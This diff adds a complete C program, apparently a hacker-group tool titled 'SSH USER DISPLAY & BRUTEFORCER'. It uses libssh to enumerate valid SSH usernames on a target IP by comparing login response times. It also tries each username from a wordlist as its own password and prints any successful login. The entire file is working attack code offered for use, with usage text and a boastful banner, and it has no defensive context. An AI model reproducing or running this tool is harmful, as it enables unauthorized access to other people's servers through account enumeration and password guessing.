@@ -1,0 +1,161 @@
+/*
+ * SSH USER DISPLAY & BRUTEFORCER by IaM
+ *
+ * To compile: gcc -o brutessh brutessh.c -lssh
+ * It needs libssh-0.1
+ *
+ */
+
+
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <string.h>
+#include <termios.h>
+
+#include <sys/select.h>
+#include <sys/time.h>
+#include <signal.h>
+#include <errno.h>
+#include <libssh/libssh.h>
+#include <libssh/sftp.h>
+
+#include <fcntl.h>
+
+#define MAXCMD 12
+
+
+int main(int argc, char *argv[])
+{
+   int ret;
+   time_t t1, t2;
+   
+   FILE *fp;
+   char *c;
+   char username[1024];
+   int tiempo;
+   
+   if (argc < 2)
+   {
+       banner();
+        printf("Forma de uso: %s <ip> <fichero de usuarios>\n", argv[0]);
+       exit(0);
+   }
+   
+
+   
+   fp = fopen (argv[2], "r");
+   if (fp == NULL)
+   {
+      printf("No se ha podido abrir el fichero de usuarios\n");
+      exit(-1);
+   }
+   
+   /* Primero vamos a provar uno que sepamos que no existe */
+   (void) time (&t1);
+   ret = conectar_ssh ("nonexistenuser", "nonexistentpassw", argv[1]);
+   (void) time (&t2);
+   tiempo = t2-t1;
+   
+   banner();
+
+   printf("Are you lucky today ? ;)\n");
+   printf("Searching users (please wait) ..................\n");
+   
+   while (fgets (username, sizeof(username), fp))
+   {
+      c = strchr(username, '\n');
+      if (c != NULL) *c = '\0';
+      printf("                         \r");
+      printf("username: %s\r", username);
+      fflush(stdout);
+      
+      (void) time (&t1);
+      ret = conectar_ssh (username, username, argv[1]);
+      (void) time (&t2);
+         
+      if (ret == 0)
+      {
+         printf("Login correcto: %s:%s\n", username, username);
+         exit(0);
+      }
+      
+      if ((t2 - t1) > tiempo)
+      {
+          /*vamos a volver a provar por si la hemos cagado */
+         (void) time (&t1);
+         ret = conectar_ssh (username, username, argv[1]);
+         (void) time (&t2);
+         if ((t2 - t1) >= tiempo)
+            printf("usuario encontrado: %s\n", username);
+      }
+   
+   }
+}
+
+banner()
+{
+   printf("\n\n\n");
+   printf("\E[31m" "\t-------------------\n");
+   printf("\E[31m" "\t  SSH USER DISPLAY \n");
+   printf("\E[31m" "\t   Coded by IaM    \n");
+   printf("\E[31m" "\t    SSH BRUTE   \n");
+   printf("\E[31m" "\t   Greets to all   \n");
+   printf("\E[31m" "\t members\n");
+   printf("\E[31m" "\t-------------------\n");
+   printf("\E[m" "\n\n");
+}
+
+int conectar_ssh(const char *username,
+      const char *passw,
+      const char *ipaddress)
+{
+   SSH_SESSION *session;
+   SSH_OPTIONS *options;
+   int argc = 1;
+   char *argv[]={"none"};
+   int auth = 0;
+
+   char *banner;
+   char hash[MD5_DIGEST_LEN];
+   
+   options = ssh_getopt(&argc, argv);
+   options_set_username(options, username);
+   options_set_host (options, ipaddress);
+   
+   session = ssh_connect (options);
+
+   if (!session){
+       fprintf(stderr, "Connection failed: %s\n", ssh_get_error(NULL));
+       return -1;   
+   }
+
+   /* No te acuerdas del hash de memoria ? xDD */
+   pubkey_get_hash(session, hash);
+   /*ssh_print_hexa("Public key hash", hash, MD5_DIGEST_LEN);*/
+   
+   auth = ssh_userauth_autopubkey(session);
+   if (auth == AUTH_ERROR){
+      fprintf(stderr, "Authenticaing with pubkey: %s\n",
+            ssh_get_error(session));
+      return -1;
+   }
+   
+   banner = ssh_get_issue_banner(session);
+   if (banner){
+      printf("%s\n", banner);
+      free(banner);
+   }
+   if (auth != AUTH_SUCCESS){
+      /*password=getpass("Password : ");*/
+      if (ssh_userauth_password(session,
+         NULL, passw) != AUTH_SUCCESS){
+           ssh_disconnect(session);
+           return -1;
+      }
+   }
+
+   ssh_say(1, "Authentication success\n");
+   ssh_disconnect(session);
+   return 0;
+} 
